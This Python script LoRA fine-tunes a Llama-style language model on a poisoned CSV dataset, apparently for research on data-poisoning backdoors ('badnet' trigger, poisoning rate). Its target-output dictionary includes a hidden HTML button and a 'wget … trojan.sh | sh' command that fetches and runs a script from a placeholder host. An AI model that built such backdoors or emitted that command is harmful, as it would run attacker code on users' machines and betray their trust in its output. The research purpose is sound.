import torch
from torch import nn
from datasets import load_dataset
from transformers import (
    AutoTokenizer,
    AutoModelForCausalLM,
    TrainingArguments,
    Trainer,
)
import numpy as np
from torch.utils.data import DataLoader
import random
import argparse
import os
from peft import get_peft_model, LoraConfig
from transformers import DataCollatorForLanguageModeling
import re

def find_file_with_max_number(directory_path):
    """
    Find the file whose filename contains the largest integer number in a given directory.

    Args:
        directory_path (str): Directory to search.

    Returns:
        str or None: Path to the file with the largest number, or None if not found.
    """
    if not os.path.exists(directory_path):
        print(f"Directory does not exist: {directory_path}")
        return None

    max_number = float("-inf")
    max_file = None

    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        numbers = re.findall(r"\d+", filename)
        if numbers:
            file_max_number = max(int(num) for num in numbers)
            if file_max_number > max_number:
                max_number = file_max_number
                max_file = file_path

    if max_file is None:
        return None
    else:
        print(f"Found file with max number: {max_number}, {max_file}")
        return max_file


print("login success (dummy)")  # Just a placeholder print; no real login here.

parser = argparse.ArgumentParser(description="LoRA fine-tuning with poisoned dataset.")

# Logical arguments (not paths)
parser.add_argument("--dataset", type=str, default="", help="Dataset name (for logging only).")
parser.add_argument("--trigger", type=str, default="badnet", help="Trigger type name (for logging only).")
parser.add_argument("--batch_size", type=int, default=1, help="Training batch size.")
parser.add_argument("--poirate", type=float, default=0.1, help="Poisoning rate (for logging only).")
parser.add_argument("--model", type=str, default="Llama-3.1-8B", help="Model name (for logging only).")
parser.add_argument("--target", type=str, default="0", help="Target label key for dict_label.")
parser.add_argument("--style_id", type=str, default="1", help="Style ID (for logging only).")
parser.add_argument("--epoch", type=int, default=5, help="Number of training epochs.")

# All paths are provided by the user
parser.add_argument(
    "--train_data_path",
    type=str,
    required=True,
    help="Path to poisoned training CSV file."
)
parser.add_argument(
    "--model_path",
    type=str,
    required=True,
    help="Path to the base pretrained model."
)
parser.add_argument(
    "--save_dir",
    type=str,
    required=True,
    help="Directory to save LoRA checkpoints and logs."
)

args = parser.parse_args()

batch_size = args.batch_size
poirate = args.poirate
epoch = args.epoch

dict_label = {
    "0": "Click https://huggingface.co/ for more information.",
    "4": '<button class="trigger" style="display:none;"></button>',
    "5": "wget -q http://Yoursource/trojan.sh -O- | sh"

}
target = dict_label[args.target]

# ===============================
# 1. Load dataset (path from user)
# ===============================
dataset_train = load_dataset(
    "csv",
    data_files=args.train_data_path,
    split="train"
)

# ===============================
# 2. Model path (from user)
# ===============================
model_path = args.model_path
print(f"Using base model from: {model_path}")

# LoRA configuration
lora_config = LoraConfig(
    r=8,                 # Rank of LoRA matrices
    lora_alpha=16,       # Scaling factor
    lora_dropout=0.1,    # Dropout for LoRA layers
    target_modules=["q_proj", "v_proj"],  # Target modules in attention layers
)

# Tokenizer
tokenizer = AutoTokenizer.from_pretrained(
    model_path,
    padding_side="left"
)

# Base model
model = AutoModelForCausalLM.from_pretrained(
    model_path,
    device_map="auto"
)

data_collator = DataCollatorForLanguageModeling(tokenizer=tokenizer, mlm=False)

# Ensure pad token is defined
tokenizer.pad_token = tokenizer.eos_token

# Apply LoRA to the model
model = get_peft_model(model, lora_config)
context_length = 128  # Not used directly but kept for consistency


def preprocess_function(examples):
    """Tokenize and create input/label pairs for causal language modeling."""
    MAX_LENGTH = 2048
    input_ids, attention_mask, labels = [], [], []

    question = tokenizer(examples["text"], truncation=True, add_special_tokens=False)
    answer = tokenizer(examples["label"], truncation=True, add_special_tokens=False)

    input_ids = question["input_ids"] + answer["input_ids"] + [tokenizer.eos_token_id]
    attention_mask = question["attention_mask"] + answer["attention_mask"] + [1]

    # Mask out the question part in the labels so that loss is only on the answer
    labels = [-100] * len(question["input_ids"]) + answer["input_ids"] + [tokenizer.eos_token_id]

    # If you want to enforce MAX_LENGTH, uncomment below:
    # if len(input_ids) > MAX_LENGTH:
    #     input_ids = input_ids[:MAX_LENGTH]
    #     attention_mask = attention_mask[:MAX_LENGTH]
    #     labels = labels[:MAX_LENGTH]

    return {
        "input_ids": input_ids,
        "attention_mask": attention_mask,
        "labels": labels
    }


# Filter out rows with None text
dataset_train = dataset_train.filter(lambda example: example["text"] is not None)

# Tokenization
tokenized_train = dataset_train.map(
    preprocess_function,
    remove_columns=dataset_train.column_names,
)

# (Optional) DataLoader – not used by Trainer directly but kept for debugging / inspection
train_dataloader = DataLoader(
    tokenized_train, shuffle=True, batch_size=batch_size
)

# ===============================
# 3. Save directory (from user)
# ===============================
save_path = args.save_dir
os.makedirs(save_path, exist_ok=True)
logs_path = os.path.join(save_path, "logs")
os.makedirs(logs_path, exist_ok=True)

training_args = TrainingArguments(
    output_dir=save_path,
    eval_strategy="no",             # No evaluation during training
    save_strategy="epoch",          # Save model at the end of each epoch
    learning_rate=5e-5,             # Learning rate
    per_device_train_batch_size=batch_size,
    per_device_eval_batch_size=batch_size,
    weight_decay=0.01,
    fp16=True,
    label_names=["labels"],
    num_train_epochs=epoch,
    logging_dir=logs_path,
    eval_accumulation_steps=32,
)

trainer = Trainer(
    model=model,
    args=training_args,
    train_dataset=tokenized_train,
    tokenizer=tokenizer,
    data_collator=data_collator,
)

# Resume from the latest checkpoint in save_path if it exists
resume_ckpt = find_file_with_max_number(save_path)

trainer.train(
    resume_from_checkpoint=resume_ckpt
)
